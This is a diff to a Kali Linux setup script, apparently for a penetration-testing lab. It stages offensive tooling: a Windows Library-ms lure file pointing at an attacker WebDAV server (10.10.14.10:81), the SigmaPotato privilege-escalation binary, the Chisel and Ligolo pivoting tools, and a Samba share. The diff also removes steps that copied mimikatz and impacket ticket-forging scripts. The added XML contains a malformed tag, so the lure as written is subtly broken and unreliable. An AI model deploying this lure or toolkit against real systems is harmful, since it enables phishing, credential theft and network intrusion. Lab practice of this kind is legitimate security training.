@@ -61,25 +61,39 @@ echo "[*] Creating the 'webdav' directory in your home directory..."
 mkdir -p ~/webdav
 
 # ---------------------------------------------------------------------------
+# 8.1. Add config.Library-ms to ~/webdav
+# ---------------------------------------------------------------------------
+echo "[*] Creating config.Library-ms in ~/webdav..."
+cat <<'EOF' > ~/webdav/config.Library-ms
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation<true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://10.10.14.10:81</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+EOF
+
+# ---------------------------------------------------------------------------
 # 9. Download SigmaPotato.exe to the home directory
 # ---------------------------------------------------------------------------
 echo "[*] Downloading SigmaPotato.exe..."
 wget -O ~/SigmaPotato.exe "https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe"
 
 # ---------------------------------------------------------------------------
-# 10. Copy mimikatz.exe, ticketer.py, and getTGT.py to your home directory
-# ---------------------------------------------------------------------------
-echo "[*] Updating file database..."
-sudo updatedb
-echo "[*] Copying ticketer.py to your home directory..."
-cp /usr/share/doc/python3-impacket/examples/ticketer.py ~/
-echo "[*] Copying mimikatz.exe to your home directory..."
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ~/
-echo "[*] Copying getTGT.py to your home directory..."
-cp /usr/share/doc/python3-impacket/examples/getTGT.py ~/
-
-# ---------------------------------------------------------------------------
-# 11. Create and configure a Samba share for user "kali"
+# 10. Create and configure a Samba share for user "kali"
 # ---------------------------------------------------------------------------
 echo "[*] Creating a Samba share directory..."
 mkdir -p ~/samba
@@ -110,13 +124,7 @@ echo "[*] Restarting smbd..."
 sudo systemctl restart smbd
 
 # ---------------------------------------------------------------------------
-# 12. Prepare the rockyou.txt wordlist
-# ---------------------------------------------------------------------------
-echo "[*] Decompressing rockyou.txt wordlist..."
-sudo gunzip -f /usr/share/wordlists/rockyou.txt.gz
-
-# ---------------------------------------------------------------------------
-# 13. Download and prepare Chisel (Linux and Windows versions)
+# 11. Download and prepare Chisel (Linux and Windows versions)
 # ---------------------------------------------------------------------------
 echo "[*] Downloading Chisel (Linux and Windows versions)..."
 wget -O ~/chisel_1.10.1_linux_amd64.gz "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
@@ -132,7 +140,7 @@ mv ~/chisel_1.10.1_windows_amd64 ~/chisel.exe
 chmod +x ~/chisel
 
 # ---------------------------------------------------------------------------
-# 14. Download and prepare Ligolo
+# 12. Download and prepare Ligolo
 # ---------------------------------------------------------------------------
 echo "[*] Downloading and preparing Ligolo files..."
 sudo mkdir -p /opt/Pivoting/Ligolo-NG/{Linux/{Proxy,Agent},Windows/{Proxy,Agent}}
@@ -153,15 +161,3 @@ echo "[*] Copying Ligolo proxy and agent.exe to ~/ligolo..."
 mkdir -p ~/ligolo
 cp /opt/Pivoting/Ligolo-NG/Linux/Proxy/proxy ~/ligolo/
 cp /opt/Pivoting/Ligolo-NG/Windows/Agent/agent.exe ~/ligolo/
-
-# ---------------------------------------------------------------------------
-# 15. Final file listing (for verification)
-# ---------------------------------------------------------------------------
-echo "[*] Final file listing in your home directory:"
-ls -lah ~
-echo "[*] Listing contents of the 'webdav' directory:"
-ls -lah ~/webdav
-echo "[*] Listing contents of the 'samba' directory:"
-ls -lah ~/samba
-
-echo "[*] Setup complete."
